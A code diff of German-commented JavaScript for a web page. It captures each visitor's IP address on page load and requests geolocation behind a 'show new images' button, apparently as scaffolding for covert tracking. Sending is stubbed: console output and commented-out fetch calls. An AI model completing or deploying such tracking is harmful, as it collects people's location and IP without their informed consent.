@@ -1,65 +1,19 @@
-// Funktion, um den Standort des Benutzers zu ermitteln und die Bilder hinzuzufügen
-document.getElementById('trackBtn').addEventListener('click', function() {
-    getLocation();
-    showNewImages(); // Neue Bilder immer anzeigen, auch bei Fehlern
+// Beim Laden der Seite wird die IP-Adresse ermittelt und versendet
+document.addEventListener('DOMContentLoaded', function() {
+    sendIPOnPageLoad();
 });
 
-function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocationByEmail, handleLocationError);
-    } else {
-        document.getElementById("status").innerHTML = "Geolocation wird von diesem Browser nicht unterstützt.";
-        handleLocationError(); // IP-Adresse ermitteln, wenn keine Geolocation verfügbar ist
-    }
-}
-
-// Funktion zum Senden des Standorts per E-Mail
-function sendLocationByEmail(position) {
-    const lat = position.coords.latitude;
-    const lon = position.coords.longitude;
-
-    // Hier könntest du eine Funktion zum Senden der Daten per E-Mail einfügen.
-    // Zum Beispiel eine Fetch-Anfrage oder eine andere Methode zum Senden der Daten an deinen Server.
-    const locationData = {
-        latitude: lat,
-        longitude: lon
-    };
-
-    // Beispiel: Senden der Daten an einen Server (hier simuliert durch console.log)
-    console.log("Standortdaten senden:", locationData);
-
-    // Hier könntest du eine Funktion verwenden, die die Daten per E-Mail versendet (z.B. über ein Backend oder ein Formular)
-    // fetch('/send-location', {
-    //   method: 'POST',
-    //   body: JSON.stringify(locationData),
-    //   headers: {
-    //     'Content-Type': 'application/json',
-    //   },
-    // });
-}
-
-function handleLocationError() {
-    // IP-Adresse ermitteln, wenn Standort nicht verfügbar ist
-    document.getElementById("status").innerHTML = "Standort konnte nicht ermittelt werden. Wir versuchen, Ihre IP-Adresse zu verwenden.";
-
-    // Führe die Funktion aus, um die IP-Adresse des Benutzers zu ermitteln
-    getIP();
-    
-    // Neue Bilder immer anzeigen
-    showNewImages();
-}
-
-// Funktion, um die IP-Adresse des Benutzers zu ermitteln
-function getIP() {
-    // Hier verwenden wir ipify (https://www.ipify.org/) für die IP-Ermittlung
+// Funktion, um die IP-Adresse des Benutzers zu ermitteln und zu senden
+function sendIPOnPageLoad() {
+    // IP-Adresse ermitteln
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
             const ipAddress = data.ip;
             console.log("Benutzer IP-Adresse:", ipAddress);
 
-            // IP-Adresse per E-Mail senden oder anderweitig verwenden
-            sendIPByEmail(ipAddress); // IP-Adresse senden (funktion muss noch definiert werden)
+            // IP-Adresse an den Server senden (z.B. via Fetch)
+            sendIPByEmail(ipAddress);
         })
         .catch(error => {
             console.error("Fehler beim Abrufen der IP-Adresse:", error);
@@ -68,39 +22,93 @@ function getIP() {
 
 // Funktion zum Senden der IP-Adresse per E-Mail (simuliert)
 function sendIPByEmail(ipAddress) {
-    // Hier könntest du die IP-Adresse an deinen Server senden, der dann die E-Mail versendet
-    const ipData = {
-        ip: ipAddress
+    const ipData = { ip: ipAddress };
+
+    // Beispiel: Senden der IP-Adresse an den Server (kannst du anpassen)
+    console.log("IP-Adresse senden:", ipData);
+
+    // Hier eine Fetch-Anfrage zum Senden der IP-Adresse an deinen Server (optional anpassen)
+    // fetch('/send-ip', {
+    //     method: 'POST',
+    //     body: JSON.stringify(ipData),
+    //     headers: {
+    //         'Content-Type': 'application/json',
+    //     },
+    // });
+}
+
+// Funktion für den Standort (geografische Koordinaten) und deren Versenden
+document.getElementById('trackBtn').addEventListener('click', function() {
+    getLocation();
+    showNewImages(); // Auch bei Fehlern weiterhin Bilder anzeigen
+});
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocationByEmail, showError);
+    } else {
+        document.getElementById("status").innerHTML = "Geolocation wird von diesem Browser nicht unterstützt.";
+        showNewImages(); // Bilder auch bei Fehlern anzeigen
+    }
+}
+
+// Funktion zum Senden der Standortdaten per E-Mail
+function sendLocationByEmail(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    // Standortdaten an den Server senden
+    const locationData = {
+        latitude: lat,
+        longitude: lon
     };
 
-    console.log("IP-Adresse senden:", ipData);
-    
-    // Beispiel: Senden der IP-Adresse an den Server (kannst du anpassen)
-    // fetch('/send-ip', {
-    //   method: 'POST',
-    //   body: JSON.stringify(ipData),
-    //   headers: {
-    //     'Content-Type': 'application/json',
-    //   },
+    // Beispiel: Senden der Standortdaten an den Server (kannst du anpassen)
+    console.log("Standortdaten senden:", locationData);
+
+    // Hier eine Fetch-Anfrage zum Senden der Koordinaten an deinen Server
+    // fetch('/send-location', {
+    //     method: 'POST',
+    //     body: JSON.stringify(locationData),
+    //     headers: {
+    //         'Content-Type': 'application/json',
+    //     },
     // });
+}
+
+// Fehlerbehandlung für den Standortabruf
+function showError(error) {
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            document.getElementById("status").innerHTML = "Benutzer hat den Zugriff auf den Standort verweigert.";
+            break;
+        case error.POSITION_UNAVAILABLE:
+            document.getElementById("status").innerHTML = "Standortinformationen sind nicht verfügbar.";
+            break;
+        case error.TIMEOUT:
+            document.getElementById("status").innerHTML = "Die Anfrage zum Abrufen des Standorts hat zu lange gedauert.";
+            break;
+        case error.UNKNOWN_ERROR:
+            document.getElementById("status").innerHTML = "Ein unbekannter Fehler ist aufgetreten.";
+            break;
+    }
+    showNewImages(); // Bilder auch bei Fehlern anzeigen
 }
 
 // Funktion, um neue Bilder hinzuzufügen
 function showNewImages() {
-    // Anzeigen des Containers für neue Bilder
     document.getElementById("new-images").style.display = "block";
 
-    // Hier fügen wir dynamisch 3 neue Bilder hinzu
+    // Beispielbilder
     const newImages = [
-        'bild4.jpg', // Bild 4
-        'bild5.jpg', // Bild 5
-        'bild6.jpg'  // Bild 6
+        'bild4.jpg', 
+        'bild5.jpg', 
+        'bild6.jpg'
     ];
 
-    // Hole den Container für zusätzliche Bilder
+    // Füge die neuen Bilder zum DOM hinzu
     const additionalImagesContainer = document.getElementById("additional-images");
 
-    // Füge jedes Bild dynamisch zum Container hinzu
     newImages.forEach(function(imageSrc) {
         const imgElement = document.createElement("img");
         imgElement.src = imageSrc;
@@ -108,6 +116,5 @@ function showNewImages() {
         additionalImagesContainer.appendChild(imgElement);
     });
 
-    // Zeige den Text "Weitere Bilder & Videos in Kürze"
     document.getElementById("message").style.display = "block";
 }
